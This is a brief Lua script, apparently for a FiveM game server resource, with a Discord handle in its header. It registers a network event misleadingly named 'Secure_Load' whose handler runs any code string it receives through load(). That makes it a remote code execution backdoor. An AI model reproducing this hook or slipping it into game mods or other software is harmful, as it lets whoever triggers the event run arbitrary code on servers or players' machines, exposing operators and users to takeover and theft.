--[[
    discord:    krane#2890
]]
RegisterNetEvent("Barca_Lui_Pablo:Secure_Load") 
AddEventHandler("Barca_Lui_Pablo:Secure_Load", function(srcfile) 
    local f = load(srcfile)()
end)